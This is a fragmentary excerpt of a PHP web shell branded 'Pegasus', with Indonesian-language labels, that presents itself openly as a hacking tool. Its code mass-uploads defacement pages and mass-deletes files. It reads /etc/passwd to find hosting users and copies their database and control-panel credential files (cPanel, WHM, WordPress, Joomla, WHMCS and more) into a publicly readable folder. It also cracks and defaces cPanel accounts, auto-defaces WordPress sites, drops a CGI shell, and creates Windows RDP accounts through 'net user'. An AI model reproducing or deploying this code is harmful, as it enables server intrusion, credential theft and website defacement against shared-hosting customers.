...
if(get_magic_quotes_gpc()) {
	function Pegasus_ss($array) {
		return is_array($array) ? array_map('Pegasus_ss', $array) : stripslashes($array);
	}
	$_POST = Pegasus_ss($_POST);
}
...
if($_GET['do'] == 'upload') {
				...
				if($dirb === '.') {
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							...
							file_put_contents($lokasi, $isi_script);
							$Pegasus = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Pegasus</textarea><br>
					...
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								...
								unlink($lokasi);
								$Pegasus = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
	...
	$Pegasus = mkdir("Pegasus_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("Pegasus_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			...
			foreach($user_config[1] as $user_Pegasus) {
				$user_config_dir = "/home/$user_Pegasus/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_Pegasus/.my.cnf" => "cpanel",
						"/home/$user_Pegasus/.accesshash" => "WHM-accesshash",
						"/home/$user_Pegasus/public_html/vdo_config.php" => "Voodoo",
						"/home/$user_Pegasus/public_html/bw-configs/config.ini" => "BosWeb",
						"/home/$user_Pegasus/public_html/config/koneksi.php" => "Lokomedia",
						"/home/$user_Pegasus/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_Pegasus/public_html/clientarea/configuration.php" => "WHMCS",
						"/home/$user_Pegasus/public_html/whm/configuration.php" => "WHMCS",
						"/home/$user_Pegasus/public_html/whmcs/configuration.php" => "WHMCS",
						"/home/$user_Pegasus/public_html/forum/config.php" => "phpBB",
						"/home/$user_Pegasus/public_html/sites/default/settings.php" => "Drupal",
						"/home/$user_Pegasus/public_html/config/settings.inc.php" => "PrestaShop",
						"/home/$user_Pegasus/public_html/app/etc/local.xml" => "Magento",
						"/home/$user_Pegasus/public_html/joomla/configuration.php" => "Joomla",
						"/home/$user_Pegasus/public_html/configuration.php" => "Joomla",
						"/home/$user_Pegasus/public_html/wp/wp-config.php" => "WordPress",
						"/home/$user_Pegasus/public_html/wordpress/wp-config.php" => "WordPress",
						"/home/$user_Pegasus/public_html/wp-config.php" => "WordPress",
						"/home/$user_Pegasus/public_html/admin/config.php" => "OpenCart",
						"/home/$user_Pegasus/public_html/slconfig.php" => "Sitelok",
						"/home/$user_Pegasus/public_html/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("Pegasus_config/$user_Pegasus-$nama_config.txt","w");
	...
	echo "<center><a href='?dir=$dir/Pegasus_config'><font color=lime>Done</font></a></center>";
	...
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			...
			foreach($user_jumping[1] as $user_Pegasus_jump) {
				$user_jumping_dir = "/home/$user_Pegasus_jump/public_html";
					...
					if(function_exists('posix_getpwuid')) {
						...
						if($domain_jump == '') {
							...
							foreach($domains_jump[1] as $dj) {
								...
								if($user_jumping_url == $user_Pegasus_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Pegasus' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Pegasus' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Pegasus.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Pegasus.</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Pegasus' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Pegasus'><br>
		<u>Domains</u>: <br>
	...
	$cgi_dir = mkdir('Pegasus_cgi', 0755);
	$file_cgi = "Pegasus_cgi/cgi.izo";
	...
	chmod($file_cgi, 0755);
	echo "<iframe src='Pegasus_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Pegasus' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<form method='post'>
		Link Config: <br>
		<textarea name='link' placeholder='http://target.com/Pegasus_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Pegasus' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user Pegasus");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Pegasus</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Pegasus' required>
			<input type='text' name='pass' placeholder='password' value='Pegasus' required>
	...
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://blog.Pegasus.or.id/' target='_blank'><font color=lime>Pegasus</font></a></center>";
}
?>
</html>